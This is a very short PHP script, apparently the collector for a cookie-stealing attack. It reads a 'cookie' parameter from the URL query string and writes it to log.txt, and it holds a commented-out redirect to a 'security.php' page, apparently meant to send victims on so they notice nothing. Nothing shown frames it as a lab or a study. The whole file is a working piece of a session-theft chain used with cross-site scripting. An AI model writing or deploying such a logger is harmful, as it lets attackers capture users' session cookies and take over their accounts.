<?php
$_COOKIE = $_GET["cookie"];
file_put_contents('log.txt', $_COOKIE);
// header('Location: /UnityBackend/security.php');
?>